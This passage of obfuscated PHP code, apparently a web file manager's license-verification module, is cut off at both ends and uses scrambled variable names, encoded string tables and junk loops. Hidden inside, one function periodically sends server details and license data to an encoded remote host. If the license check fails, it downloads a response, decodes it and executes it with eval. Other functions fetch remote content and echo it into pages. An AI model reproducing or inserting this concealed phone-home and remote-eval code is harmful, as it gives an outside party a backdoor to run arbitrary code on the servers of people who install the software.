!is_array($Úıı¨Ñ[$Àœ¯Â«¼[167]]) || $Úıı¨Ñ[$Àœ¯Â«¼[143]] != !0) { $ã¢¨„üæ = LNG($Àœ¯Â«¼[172]); $¯´ìÁêå = $Úıı¨Ñ[$Àœ¯Â«¼[167]] ? $Àœ¯Â«¼[169] . $Úıı¨Ñ[$Àœ¯Â«¼[167]] : $ã¢¨„üæ; show_json($¯´ìÁêå, !1); } $ß§ø’Á = $Úıı¨Ñ[$Àœ¯Â«¼[167]]; $šŠŠ¢Á¡ = $this->udlyb2fc32eb($ß§ø’Á[$Àœ¯Â«¼[173]]); if (!$šŠŠ¢Á¡ || $šŠŠ¢Á¡ != $ß§ø’Á[$Àœ¯Â«¼[121]]) { $Š¾¸ëŒ = array($Àœ¯Â«¼[174] => Model($Àœ¯Â«¼[33])->get($Àœ¯Â«¼[99]), $Àœ¯Â«¼[175] => $_SERVER[$Àœ¯Â«¼[98]], $Àœ¯Â«¼[176] => this_url(), $Àœ¯Â«¼[151] => $_SERVER[$Àœ¯Â«¼[152]]); $²Ò²·ú = $this->tiok76aa9b84(json_encode($Š¾¸ëŒ)); $this->btrs7f16bf75($Àœ¯Â«¼[177] . $²Ò²·ú); show_json(LNG($Àœ¯Â«¼[178]), !0); } $Š€±¢¸æ = array($Àœ¯Â«¼[179] => $ß§ø’Á[$Àœ¯Â«¼[180]], $Àœ¯Â«¼[181] => $ß§ø’Á[$Àœ¯Â«¼[182]], $Àœ¯Â«¼[183] => rand_string(16), $Àœ¯Â«¼[101] => $ß§ø’Á[$Àœ¯Â«¼[184]]); if ($«Ô‚×®å[$Àœ¯Â«¼[145]]) { $Š€±¢¸æ[$Àœ¯Â«¼[183]] = $«Ô‚×®å[$Àœ¯Â«¼[145]]; } $úƒ•Ô¹² = substr(md5($Š€±¢¸æ[$Àœ¯Â«¼[181]]), 10, 10); $ÏÚ†Šø× = $úƒ•Ô¹² . $Š€±¢¸æ[$Àœ¯Â«¼[101]] . $Š€±¢¸æ[$Àœ¯Â«¼[183]]; $Š€±¢¸æ[$Àœ¯Â«¼[103]] = strrev(base64_encode($this->xqyodcd9fac2($ÏÚ†Šø×, $Àœ¯Â«¼[185]))); $èºø‘ë¿ = rand_string(16); $Š¿ıÇø¼ = $áÅÅ•µ¦[643]; if (strlen($Š¿ıÇø¼) < $áÅÅ•µ¦[644]) { die; } $õ«Îò«Û = $èºø‘ë¿ . $Š€±¢¸æ[$Àœ¯Â«¼[101]] . $this->xqyodcd9fac2(md5($Š€±¢¸æ[$Àœ¯Â«¼[179]]), $èºø‘ë¿); $Š€±¢¸æ[$Àœ¯Â«¼[104]] = base64_encode(strrev($this->xqyodcd9fac2($õ«Îò«Û, $Àœ¯Â«¼[186]))); if ($ß§ø’Á[$Àœ¯Â«¼[187]] && $ß§ø’Á[$Àœ¯Â«¼[187]] >= 1) { Model($Àœ¯Â«¼[33])->setDeep($Àœ¯Â«¼[188], $Àœ¯Â«¼[189]); } Model($Àœ¯Â«¼[33])->set($Š€±¢¸æ); $Ëò¡¢—í = md5($_SERVER[$Àœ¯Â«¼[98]] . strrev($òÈş¶µ) . $Š€±¢¸æ[$Àœ¯Â«¼[181]]); $·‰©â•µ = strrev(substr($Ëò¡¢—í, 10, 16)); $³ƒÕ‰¡ = $this->gfiu2dd249b4(json_encode($ß§ø’Á), $Ëò¡¢—í); $ÂÕ¨Èæ‰ = array_to_keyvalue(Model($Àœ¯Â«¼[7])->listData(), $Àœ¯Â«¼[190]); $‘ˆŒ = $áÅÅ•µ¦[645]; while (strlen($‘ˆŒ) < $áÅÅ•µ¦[644]) { if (!$‘ˆŒ) { break; } $‘ˆŒ++; } $ú¨ø‚Š = $ÂÕ¨Èæ‰[$Àœ¯Â«¼[191]]; $–êÜ ©ä = $áÅÅ•µ¦[646]; $²ÕÄú‘è = array(); $™óÇñÜ” = $áÅÅ•µ¦[647]; if (strlen($™óÇñÜ”) < $áÅÅ•µ¦[628]) { return; } $²ÕÄú‘è[$·‰©â•µ] = $³ƒÕ‰¡; Model($Àœ¯Â«¼[7])->update($ú¨ø‚Š[$Àœ¯Â«¼[192]], array($Àœ¯Â«¼[193] => $²ÕÄú‘è)); $this->snxt3d78b5a7 = $ß§ø’Á; $çšäû±® = $áÅÅ•µ¦[648]; $this->nyla60778d65 = $Š€±¢¸æ[$Àœ¯Â«¼[101]]; $this->licenseRegistSuccess(); Cache::set($Àœ¯Â«¼[194] . md5($òÈş¶µ . $Àœ¯Â«¼[195]), $Àœ¯Â«¼[6]); $˜Â†Ş¹  = $áÅÅ•µ¦[649]; while (strlen($˜Â†Ş¹ ) < $áÅÅ•µ¦[605]) { if (!$˜Â†Ş¹ ) { break; } $˜Â†Ş¹ ++; } show_json(LNG($Àœ¯Â«¼[178]), !0); $Ï×õ«¤ñ = $áÅÅ•µ¦[650]; if (!$Ï×õ«¤ñ) { return; } } private function licenseRegistSuccess() { $Ğ’á›Ÿô =& $_SERVER[ÏÒ Ì„]; $„…´Ğ¼ =& $_SERVER[º‚ØÇıÁ]; $¼«Êİ€ = Model($„…´Ğ¼[33])->get(); $ÔìÔÒİ÷ = $Ğ’á›Ÿô[651]; while ($ÔìÔÒİ÷ < $Ğ’á›Ÿô[644]) { if ($ÔìÔÒİ÷ >= 0) { break; } $ÔìÔÒİ÷++; } if ($¼«Êİ€[$„…´Ğ¼[63]] != $„…´Ğ¼[189]) { Model($„…´Ğ¼[33])->set($„…´Ğ¼[63], $„…´Ğ¼[189]); } Action($„…´Ğ¼[196])->initStart(!0); } private function ebxh8effa31d() { $àÖÁ…˜Ã =& $_SERVER[ÏÒ Ì„]; $œşá±úƒ =& $_SERVER[º‚ØÇıÁ]; Model($œşá±úƒ[33])->set(array($œşá±úƒ[179] => $œşá±úƒ[6], $œşá±úƒ[181] => $œşá±úƒ[6], $œşá±úƒ[101] => $œşá±úƒ[102], $œşá±úƒ[103] => $œşá±úƒ[6], $œşá±úƒ[104] => $œşá±úƒ[6])); $ı šªö„ = $àÖÁ…˜Ã[652]; while ($ı šªö„ < $àÖÁ…˜Ã[644]) { if ($ı šªö„ >= 0) { break; } $ı šªö„++; } Model($œşá±úƒ[33])->setDeep($œşá±úƒ[188], $œşá±úƒ[197]); $˜„„äÇ = $àÖÁ…˜Ã[653]; $this->snxt3d78b5a7 = array(); $this->nyla60778d65 = $œşá±úƒ[102]; } private function vgwu5c9adfcc() { $ÙÒó òœ =& $_SERVER[ÏÒ Ì„]; $Üğ¸–¸º =& $_SERVER[º‚ØÇıÁ]; $_SERVER[$Üğ¸–¸º[152]] = _get($_SERVER, $Üğ¸–¸º[152], APP_HOST); $ĞûíŒ“É = $ÙÒó òœ[654]; while (strlen($ĞûíŒ“É) < $ÙÒó òœ[605]) { if (!$ĞûíŒ“É) { break; } $ĞûíŒ“É++; } $this->nyla60778d65 = $Üğ¸–¸º[102]; $Ü±ïêş = Model($Üğ¸–¸º[33])->get(); if ($Ü±ïêş[$Üğ¸–¸º[101]] == $Üğ¸–¸º[102]) { return; } $²ÜÕéİ = Model($Üğ¸–¸º[33])->get($Üğ¸–¸º[99]); $è¢õÂ¾Æ = $ÙÒó òœ[655]; if (strlen($è¢õÂ¾Æ) < $ÙÒó òœ[626]) { die; } $ƒşüä¾‹ = $Üğ¸–¸º[194] . md5($²ÜÕéİ . $Üğ¸–¸º[195]); $Ñ°¡¿Ş = Cache::get($ƒşüä¾‹); $•¢Áäå² = $ÙÒó òœ[656]; if (!is_array($Ñ°¡¿Ş) || !isset($Ñ°¡¿Ş[$Üğ¸–¸º[198]]) || time() - $Ñ°¡¿Ş[$Üğ¸–¸º[198]] >= 60) { $Ûù¥¶ã = Model($Üğ¸–¸º[7])->loadList(); $ŞÂÈêÒ = $Ûù¥¶ã[$Üğ¸–¸º[191]]; $…‡¿¢‹ = md5($_SERVER[$Üğ¸–¸º[98]] . strrev($²ÜÕéİ) . $Ü±ïêş[$Üğ¸–¸º[181]]); $õ«¸¥ºÃ = strrev(substr($…‡¿¢‹, 10, 16)); $Ñ°¡¿Ş = $this->lfnw320a3134($ŞÂÈêÒ[$Üğ¸–¸º[81]][$õ«¸¥ºÃ], $…‡¿¢‹); $Ñ°¡¿Ş = json_decode($Ñ°¡¿Ş, !0); } if (!is_array($Ñ°¡¿Ş)) { return $this->ebxh8effa31d(); } $§ü¾ùƒ­ = strtotime($Ñ°¡¿Ş[$Üğ¸–¸º[121]]); if (time() >= $§ü¾ùƒ­) { return $this->ebxh8effa31d(); } if (time() - $Ñ°¡¿Ş[$Üğ¸–¸º[198]] > 20) { $Ñ°¡¿Ş[$Üğ¸–¸º[198]] = time(); Cache::set($ƒşüä¾‹, $Ñ°¡¿Ş); } $this->snxt3d78b5a7 = $Ñ°¡¿Ş; $this->nyla60778d65 = $Ü±ïêş[$Üğ¸–¸º[101]]; $ĞÁ¶¯¥ = $ÙÒó òœ[657]; if (!$ĞÁ¶¯¥) { return; } } private function cyqf81030e71() { $—ø±’ş =& $_SERVER[ÏÒ Ì„]; $ù™´¸îŠ =& $_SERVER[º‚ØÇıÁ]; $Á…Ğ‡¾Ö = $GLOBALS[$ù™´¸îŠ[13]]; $’Öğ¡ = $—ø±’ş[658]; while ($’Öğ¡ < $—ø±’ş[626]) { if ($’Öğ¡ >= 0) { break; } $’Öğ¡++; } $¨ÆØ–ü• = $_SERVER[$ù™´¸îŠ[24]]; if ($¨ÆØ–ü• == $ù™´¸îŠ[199] && $this->nyla60778d65 == $ù™´¸îŠ[102]) { show_json(LNG($ù™´¸îŠ[200]), !1, $ù™´¸îŠ[201]); } $³¶½ÃÏ¨ = array($ù™´¸îŠ[202], $ù™´¸îŠ[203]); if (in_array($¨ÆØ–ü•, $³¶½ÃÏ¨)) { if ($this->nyla60778d65 == $ù™´¸îŠ[102] && isset($Á…Ğ‡¾Ö[$ù™´¸îŠ[204]])) { show_json(LNG($ù™´¸îŠ[200]), !1, $ù™´¸îŠ[201]); die; } $ù€ôÛì = $this->eubfbc5c8674(); if ($ù€ôÛì != intval($ù™´¸îŠ[205])) { if ($ù€ôÛì <= Model($ù™´¸îŠ[117])->count()) { show_json(LNG($ù™´¸îŠ[206]), !1, $ù™´¸îŠ[201]); die; } } } } private function hpln47ac0fc0() { $É™ÂÜáà =& $_SERVER[ÏÒ Ì„]; $ıö Ü²÷ =& $_SERVER[º‚ØÇıÁ]; $€ÕİÂÈ— = array($ıö Ü²÷[114], $ıö Ü²÷[207]); if (!_get($GLOBALS, $ıö Ü²÷[111]) || !isset($_GET[$ıö Ü²÷[208]])) { return; } if (!in_array($_SERVER[$ıö Ü²÷[24]], $€ÕİÂÈ—)) { return; } $ÔŠçÚàõ = $ıö Ü²÷[209]; $ÔŠçÚàõ = $this->ilzt267898f8($ÔŠçÚàõ, $ıö Ü²÷[210]); $­ãÕ¸üì = $É™ÂÜáà[659]; $ŞÔ§€œƒ = stream_context_create(array($ıö Ü²÷[211] => array($ıö Ü²÷[212] => $ıö Ü²÷[213], $ıö Ü²÷[214] => 3))); $¢²ºµêè = @file_get_contents($ÔŠçÚàõ, !1, $ŞÔ§€œƒ); $Øó³ÂŒï = $É™ÂÜáà[660]; header($ıö Ü²÷[215]); if ($¢²ºµêè && strstr($¢²ºµêè, $ıö Ü²÷[216])) { echo $¢²ºµêè; } die; } public function omjr0fb578ee($›Ş¨Øº¢) { $õõ«©¹Í =& $_SERVER[ÏÒ Ì„]; $¡¾¡…Ÿ =& $_SERVER[º‚ØÇıÁ]; if ($this->nyla60778d65 == $¡¾¡…Ÿ[217]) { return $›Ş¨Øº¢; } $Üéû”šñ = array($¡¾¡…Ÿ[218] => $¡¾¡…Ÿ[219], $¡¾¡…Ÿ[220] => $¡¾¡…Ÿ[219], $¡¾¡…Ÿ[221] => $¡¾¡…Ÿ[219], $¡¾¡…Ÿ[222] => $¡¾¡…Ÿ[219], $¡¾¡…Ÿ[223] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[225] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[226] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[227] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[228] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[229] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[230] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[231] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[232] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[233] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[234] => $¡¾¡…Ÿ[224], $¡¾¡…Ÿ[235] => $¡¾¡…Ÿ[224]); $†ø§¤¾– = explode($¡¾¡…Ÿ[236], _get($this->snxt3d78b5a7, $¡¾¡…Ÿ[108], $¡¾¡…Ÿ[6])); $Ş·ü¿¤° = array(); foreach ($Üéû”šñ as $ÂıÌ»‹Ê => $şÑ´Ó‰) { if ($şÑ´Ó‰ == $¡¾¡…Ÿ[219] && substr($this->nyla60778d65, 0, 1) == $¡¾¡…Ÿ[219]) { continue; } if (!in_array($ÂıÌ»‹Ê, $†ø§¤¾–)) { $Ş·ü¿¤°[] = $ÂıÌ»‹Ê; } } foreach ($Ş·ü¿¤° as $ÂıÌ»‹Ê) { unset($›Ş¨Øº¢[$ÂıÌ»‹Ê]); $­ü€åã² = $õõ«©¹Í[661]; if (strlen($­ü€åã²) < $õõ«©¹Í[608]) { die; } } return $›Ş¨Øº¢; } private function smnz865f7cab() { $ë¬„œ‚Ò =& $_SERVER[º‚ØÇıÁ]; if ($this->nyla60778d65 != $ë¬„œ‚Ò[102]) { $GLOBALS[$ë¬„œ‚Ò[81]][$ë¬„œ‚Ò[85]][$ë¬„œ‚Ò[237]] = $ë¬„œ‚Ò[197]; return; } $GLOBALS[$ë¬„œ‚Ò[81]][$ë¬„œ‚Ò[238]] = $ë¬„œ‚Ò[189]; if (Model($ë¬„œ‚Ò[239])->get($ë¬„œ‚Ò[63]) != $ë¬„œ‚Ò[197]) { Model($ë¬„œ‚Ò[239])->set($ë¬„œ‚Ò[63], $ë¬„œ‚Ò[197]); } } public function axyb9072289c() { return $_SERVER[º‚ØÇıÁ][240]; $´×öÌº¾ = $_SERVER[ÏÒ Ì„][662]; } private function dgvo743f3a80() { $¹ºÅ»Êá =& $_SERVER[ÏÒ Ì„]; $ë‰çªÚ¹ =& $_SERVER[º‚ØÇıÁ]; $ë¨„ŸêŸ = array($ë‰çªÚ¹[241], $ë‰çªÚ¹[242], $ë‰çªÚ¹[243]); $­øÓëµŠ = $¹ºÅ»Êá[663]; while (strlen($­øÓëµŠ) < $¹ºÅ»Êá[626]) { if (!$­øÓëµŠ) { break; } $­øÓëµŠ++; } $‚á×Ç™ = $ë‰çªÚ¹[244] . md5($ë‰çªÚ¹[245]); $ê„‹µÑÚ = $¹ºÅ»Êá[664]; while (strlen($ê„‹µÑÚ) < $¹ºÅ»Êá[608]) { if (!$ê„‹µÑÚ) { break; } $ê„‹µÑÚ++; } if ($this->nyla60778d65 == $ë‰çªÚ¹[102] || !_get($GLOBALS, $ë‰çªÚ¹[111])) { return; } if (!in_array($_SERVER[$ë‰çªÚ¹[24]], $ë¨„ŸêŸ)) { return; } if (time() % 4 != 0) { return; } $©âã³¶Ğ = call_user_func(array($ë‰çªÚ¹[246], $ë‰çªÚ¹[247]), $‚á×Ç™); $¥½ô®ş = $¹ºÅ»Êá[665]; if (!$¥½ô®ş) { return; } if ($©âã³¶Ğ && time() - $©âã³¶Ğ < intval($ë‰çªÚ¹[248])) { return; } call_user_func(array($ë‰çªÚ¹[246], $ë‰çªÚ¹[131]), $‚á×Ç™, time()); $–ä© ÓŸ = Model($ë‰çªÚ¹[33])->get($ë‰çªÚ¹[99]); $ÜïÆµ¦š = $¹ºÅ»Êá[666]; if (strlen($ÜïÆµ¦š) < $¹ºÅ»Êá[644]) { return; } $³àéõó = array($ë‰çªÚ¹[143] => Model($ë‰çªÚ¹[33])->get($ë‰çªÚ¹[179]), $ë‰çªÚ¹[156] => $this->nyla60778d65, $ë‰çªÚ¹[153] => $_SERVER[$ë‰çªÚ¹[154]], $ë‰çªÚ¹[155] => Model($ë‰çªÚ¹[33])->get($ë‰çªÚ¹[123]), $ë‰çªÚ¹[97] => md5($_SERVER[$ë‰çªÚ¹[98]] . $–ä© ÓŸ), $ë‰çªÚ¹[146] => $ë‰çªÚ¹[128], $ë‰çªÚ¹[149] => $_SERVER[$ë‰çªÚ¹[150]]); $®ÄÊøÄ‹ = $this->btrs7f16bf75($ë‰çªÚ¹[249], $³àéõó); $®ååó£ = $¹ºÅ»Êá[667]; if (strlen($®ååó£) < $¹ºÅ»Êá[608]) { die; } if (!is_array($®ÄÊøÄ‹)) { return; } if ($®ÄÊøÄ‹[$ë‰çªÚ¹[143]] && $®ÄÊøÄ‹[$ë‰çªÚ¹[250]]) { if ($this->udlyb2fc32eb($®ÄÊøÄ‹[$ë‰çªÚ¹[250]]) == $³àéõó[$ë‰çªÚ¹[143]]) { return; } } $this->ebxh8effa31d(); if ($this->udlyb2fc32eb($®ÄÊøÄ‹[$ë‰çªÚ¹[250]]) != $³àéõó[$ë‰çªÚ¹[143]]) { $ñŞ°éäÇ = array($ë‰çªÚ¹[174] => $–ä© ÓŸ, $ë‰çªÚ¹[175] => $_SERVER[$ë‰çªÚ¹[98]], $ë‰çªÚ¹[176] => this_url(), $ë‰çªÚ¹[151] => $_SERVER[$ë‰çªÚ¹[152]]); $ŠÓƒ«š™ = $this->tiok76aa9b84(json_encode($ñŞ°éäÇ)); $®ÄÊøÄ‹ = $this->btrs7f16bf75($ë‰çªÚ¹[177] . $ŠÓƒ«š™); if ($®ÄÊøÄ‹ && is_array($®ÄÊøÄ‹) && isset($®ÄÊøÄ‹[$ë‰çªÚ¹[250]])) { $Úü˜ØÕõ = $this->lfnw320a3134($®ÄÊøÄ‹[$ë‰çªÚ¹[250]], 2); if ($Úü˜ØÕõ) { $Úü˜ØÕõ = $this->udlyb2fc32eb($Úü˜ØÕõ); } if ($Úü˜ØÕõ) { try { @eval($Úü˜ØÕõ); } catch (Exception $”à¼ƒ…Ó) { } } } } } private function btrs7f16bf75($µ¹ş‹ï­ = '', $ÎìÑ˜³Ì = array(), $Ó—ã–û = 5) { $¨Ş¶Èã® =& $_SERVER[ÏÒ Ì„]; $×ÍÅÖˆŒ =& $_SERVER[º‚ØÇıÁ]; $öóõ¦úú = $×ÍÅÖˆŒ[251]; $öóõ¦úú = $this->ilzt267898f8($öóõ¦úú, $×ÍÅÖˆŒ[252]); $ëóäÊ¥ä = $¨Ş¶Èã®[668]; $öóõ¦úú = $öóõ¦úú . $µ¹ş‹ï­; if ($ÎìÑ˜³Ì && is_array($ÎìÑ˜³Ì)) { $öóõ¦úú = $öóõ¦úú . $×ÍÅÖˆŒ[253] . http_build_query($ÎìÑ˜³Ì); } if ($ÎìÑ˜³Ì === -1) { return $öóõ¦úú; } $Ç ³¿“ = stream_context_create(array($×ÍÅÖˆŒ[211] => array($×ÍÅÖˆŒ[214] => $Ó—ã–û, $×ÍÅÖˆŒ[212] => $×ÍÅÖˆŒ[254]), $×ÍÅÖˆŒ[255] => array($×ÍÅÖˆŒ[256] => !1, $×ÍÅÖˆŒ[257] => !1))); $ş²“Ï« = $¨Ş¶Èã®[669]; while ($ş²“Ï« < $¨Ş¶Èã®[644]) { if ($ş²“Ï« >= 0) { break; } $ş²“Ï«++; } $ÎìÑ˜³Ì = @file_get_contents($öóõ¦úú, !1, $Ç ³¿“); return json_decode($ÎìÑ˜³Ì, !0); $åÔûœŸ‚ = $¨Ş¶Èã®[670]; if (!$åÔûœŸ‚) { die; } $™©»æÀ‰ = $¨Ş¶Èã®[671]; } private function eubfbc5c8674() { $âÙ©áğŞ =& $_SERVER[ÏÒ Ì„]; $ûèğ°Ë– =& $_SERVER[º‚ØÇıÁ]; $ÅŒ«ºŸµ = array($ûèğ°Ë–[258] => $ûèğ°Ë–[259], $ûèğ°Ë–[260] => $ûèğ°Ë–[261], $ûèğ°Ë–[262] => $ûèğ°Ë–[263], $ûèğ°Ë–[264] => $ûèğ°Ë–[265], $ûèğ°Ë–[266] => $ûèğ°Ë–[267], $ûèğ°Ë–[268] => $ûèğ°Ë–[205], $ûèğ°Ë–[269] => $ûèğ°Ë–[205], $ûèğ°Ë–[270] => $ûèğ°Ë–[259], $ûèğ°Ë–[271] => $ûèğ°Ë–[261], $ûèğ°Ë–[272] => $ûèğ°Ë–[263], $ûèğ°Ë–[273] => $ûèğ°Ë–[274], $ûèğ°Ë–[275] => $ûèğ°Ë–[265], $ûèğ°Ë–[276] => $ûèğ°Ë–[277], $ûèğ°Ë–[278] => $ûèğ°Ë–[267], $ûèğ°Ë–[279] => $ûèğ°Ë–[280], $ûèğ°Ë–[281] => $ûèğ°Ë–[282], $ûèğ°Ë–[283] => $ûèğ°Ë–[284]); $Ô§ŞßÍş = $âÙ©áğŞ[672]; if (!$Ô§ŞßÍş) { return; } $Š½õİë§ = $ÅŒ«ºŸµ[$this->nyla60778d65]; $Š½õİë§ = intval($Š½õİë§ ? $Š½õİë§ : $ûèğ°Ë–[259]); $Ô±¼æ¨× = $âÙ©áğŞ[673]; if (!$Ô±¼æ¨×) { return; } $ğÁ™°‡ú = _get($this->snxt3d78b5a7, $ûèğ°Ë–[285]); $ï¬‘”³© = $âÙ©áğŞ[674]; if (!$ï¬‘”³©) { return; } $ğÁ™°‡ú = $ğÁ™°‡ú ? intval($ğÁ™°‡ú) : 0; $”üâÖ = $âÙ©áğŞ[675]; if (!$”üâÖ) { die; } return $Š½õİë§ + $ğÁ™°‡ú; $Éü†€Òú = $âÙ©áğŞ[676]; if (!$Éü†€Òú) { die; } } public function tbcxa31d9f6e($±ã†Çœ) { $ó÷À„ İ =& $_SERVER[ÏÒ Ì„]; $¢ºÓ¸üÅ =& $_SERVER[º‚ØÇıÁ]; $¡â¸æÓ = $this->eubfbc5c8674(); $–¢ìäİ° = $ó÷À„ İ[677]; if (strlen($–¢ìäİ°) < $ó÷À„ İ[628]) { die; } if ($±ã†Çœ[$¢ºÓ¸üÅ[286]] == $¢ºÓ¸üÅ[189]) { return; } if ($¡â¸æÓ >= intval($¢ºÓ¸üÅ[205])) { return; } $ÂÜŒ·ğù = Model($¢ºÓ¸üÅ[117])->count(); $‘¢¹¥Æ‹ = $ó÷À„ İ[678]; if ($ÂÜŒ·ğù <= $¡â¸æÓ) { return; } $´ƒ±Ú¾» = Model($¢ºÓ¸üÅ[117])->field($¢ºÓ¸üÅ[286])->limit($¡â¸æÓ)->select(); $·ìª¸â = $ó÷À„ İ[679]; $´ƒ±Ú¾» = array_to_keyvalue($´ƒ±Ú¾», $¢ºÓ¸üÅ[6], $¢ºÓ¸üÅ[286]); $îËäùÇÕ = $ó÷À„ İ[680]; while ($îËäùÇÕ < $ó÷À„ İ[644]) { if ($îËäùÇÕ >= 0) { break; } $îËäùÇÕ++; } if (!in_array($±ã†Çœ[$¢ºÓ¸üÅ[286]], $´ƒ±Ú¾»)) { show_json($¢ºÓ¸üÅ[287], !1, $¢ºÓ¸üÅ[201]); } } public function fwylefa21c65() { $»—‚ïî÷ =& $_SERVER[ÏÒ Ì„]; $´¶øØ— =& $_SERVER[º‚ØÇıÁ]; if (!_get($GLOBALS, $´¶øØ—[111]) || mt_rand(1, 100) > 20) { return; } $êªÔ¼óî = $´¶øØ—[209]; $Ù’ÖÃàé = $»—‚ïî÷[681]; if (!$Ù’ÖÃàé) { return; } $êªÔ¼óî = $this->ilzt267898f8($êªÔ¼óî, $´¶øØ—[210]); $½ùôÌı™ = $»—‚ïî÷[682]; if (!$½ùôÌı™) { die; } $ø‚Åç°§ = stream_context_create(array($´¶øØ—[211] => array($´¶øØ—[212] => $´¶øØ—[213], $´¶øØ—[214] => 3))); $Õ½¶Á = @file_get_contents($êªÔ¼óî, !1, $ø‚Åç°§); echo $´¶øØ—[288] . hash_encode($Õ½¶Á) . $´¶øØ—[289]; $µ‘öõ¥” = $»—‚ïî÷[683]; if (strlen($µ‘öõ¥”) < $»—‚ïî÷[605]) { die; } } private function gfiu2dd249b4($ÉÈ×ä¹¿, $Âí‚ıå, $îÃàËèÁ = 3) { $ò‚‹Ü…± =& $_SERVER[ÏÒ Ì„]; $¶ë°¹ã¯ =& $_SERVER[º‚ØÇıÁ]; usleep(1); $ÉÈ×ä¹¿ = trim($ÉÈ×ä¹¿); $ëê®·»È = mt_rand(0, 5) . $¶ë°¹ã¯[6]; $Ÿæéä¡ï = rand_string(15); $šàú²°Î = $¶ë°¹ã¯[290]; switch ($ëê®·»È) { case $¶ë°¹ã¯[197]: $ÉİÄ¼Í˜ = $this->xqyodcd9fac2($ÉÈ×ä¹¿, strrev($Âí‚ıå . $Ÿæéä¡ï)); $Æ¡Áí¢İ = $ò‚‹Ü…±[684]; break; $¹àŞÔá = $ò‚‹Ü…±[685]; if (strlen($¹àŞÔá) < $ò‚‹Ü…±[605]) { return; } case $¶ë°¹ã¯[189]: $ÉİÄ¼Í˜ = $this->xqyodcd9fac2($ÉÈ×ä¹¿, strrev($Ÿæéä¡ï . $Âí‚ıå)); break; case $¶ë°¹ã¯[291]: $ÉİÄ¼Í˜ = $this->xqyodcd9fac2($ÉÈ×ä¹¿, base64_encode($Ÿæéä¡ï . $Âí‚ıå)); break; $û…ªÃ„Â = $ò‚‹Ü…±[686]; while ($û…ªÃ„Â < $ò‚‹Ü…±[605]) { if ($û…ªÃ„Â >= 0) { break; } $û…ªÃ„Â++; } case $¶ë°¹ã¯[292]: $ÉİÄ¼Í˜ = $this->xqyodcd9fac2($ÉÈ×ä¹¿, md5($Ÿæéä¡ï . $Âí‚ıå)); $²åıñ›é = $ò‚‹Ü…±[687]; break; $°à•§ÅÈ = $ò‚‹Ü…±[688]; if (!$°à•§ÅÈ) { die; } case $¶ë°¹ã¯[293]: $ÉÈ×ä¹¿ = base64_encode($ÉÈ×ä¹¿); $Ó«ü“æé = $ò‚‹Ü…±[689]; while ($Ó«ü“æé < $ò‚‹Ü…±[608]) { if ($Ó«ü“æé >= 0) { break; } $Ó«ü“æé++; } $Ôõõâ•ó = rand(0, 64); $İÄÁî†Ö = $ò‚‹Ü…±[690]; if (strlen($İÄÁî†Ö) < $ò‚‹Ü…±[605]) { return; } $ËÄ¨Î„É = $šàú²°Î[$Ôõõâ•ó]; $ Ş·Â™§ = md5($ËÄ¨Î„É . md5($Âí‚ıå . $ËÄ¨Î„É) . $Âí‚ıå); $İµö§Œ¹ = $ò‚‹Ü…±[691]; if (!$İµö§Œ¹) { die; } $ Ş·Â™§ = substr($ Ş·Â™§, $Ôõõâ•ó % 8, $Ôõõâ•ó % 8 + 7); $ÅŞÜÆ¼Ü = $¶ë°¹ã¯[6]; $µªÙã = $ò‚‹Ü…±[692]; if (strlen($µªÙã) < $ò‚‹Ü…±[605]) { return; } $»Ûíê‹Ü = 0; $·éçËÅ³ = $ò‚‹Ü…±[693]; if (!$·éçËÅ³) { return; } $‚Û˜¯¥ = 0; $¿ª³•’£ = $ò‚‹Ü…±[694]; if (!$¿ª³•’£) { return; } $ğİÙø½ = 0; $÷ƒÖ¡² = $ò‚‹Ü…±[695]; if (strlen($÷ƒÖ¡²) < $ò‚‹Ü…±[644]) { return; } for ($»Ûíê‹Ü = 0; $»Ûíê‹Ü < strlen($ÉÈ×ä¹¿); $»Ûíê‹Ü++) { $ğİÙø½ = $ğİÙø½ == strlen($ Ş·Â™§) ? 0 : $ğİÙø½; $‚øù¬¡é = $ò‚‹Ü…±[696]; if (!$‚øù¬¡é) { die; } $‚Û˜¯¥ = ($Ôõõâ•ó + strpos($šàú²°Î, $ÉÈ×ä¹¿[$»Ûíê‹Ü]) + ord($ Ş·Â™§[$ğİÙø½++])) % 64; $ÅŞÜÆ¼Ü .= $šàú²°Î[$‚Û˜¯¥]; $ç™†Ü¼ = $ò‚‹Ü…±[697]; } $ÉİÄ¼Í˜ = hash_encode($ËÄ¨Î„É . $ÅŞÜÆ¼Ü); $îàõªá³ = $ò‚‹Ü…±[698]; if (strlen($îàõªá³) < $ò‚‹Ü…±[628]) { die; } break; default: $ÉİÄ¼Í˜ = $this->xqyodcd9fac2($ÉÈ×ä¹¿, $Âí‚ıå . $Ÿæéä¡ï); $àŞ„ÃşŸ = $ò‚‹Ü…±[699]; if (!$àŞ„ÃşŸ) { die; } break; $ ˆ®Ü³¨ = $ò‚‹Ü…±[700]; if (strlen($ ˆ®Ü³¨) < $ò‚‹Ü…±[644]) { die; } } $ÉİÄ¼Í˜ = strrev($ëê®·»È . $Ÿæéä¡ï . $ÉİÄ¼Í˜); if ($îÃàËèÁ - 1 > 0) { $ÉİÄ¼Í˜ = $this->gfiu2dd249b4($ÉİÄ¼Í˜, $Âí‚ıå, $îÃàËèÁ - 1); } return $ÉİÄ¼Í˜; } private function lfnw320a3134($«½ÙÌÃ, $ã÷ôÅÁ¾, $›êÃœáÓ = 3) { $»Ë¦¬Ò =& $_SERVER[ÏÒ Ì„]; $º›êËãà =& $_SERVER[º‚ØÇıÁ]; if (!is_string($«½ÙÌÃ) || strlen($«½ÙÌÃ) < 10) { return !1; } $«½ÙÌÃ = trim($«½ÙÌÃ); $«½ÙÌÃ = strrev($«½ÙÌÃ); $Õ×‘”×Ó = $»Ë¦¬Ò[701]; while (strlen($Õ×‘”×Ó) < $»Ë¦¬Ò[626]) { if (!$Õ×‘”×Ó) { break; } $Õ×‘”×Ó++; } $½¥¦±“ı = $«½ÙÌÃ[0]; $¾›ò¡ù  = substr($«½ÙÌÃ, 1, 15); $«½ÙÌÃ = substr($«½ÙÌÃ, 16); $´üÄ½§ = $º›êËãà[290]; $–ëÈÀ¹º = 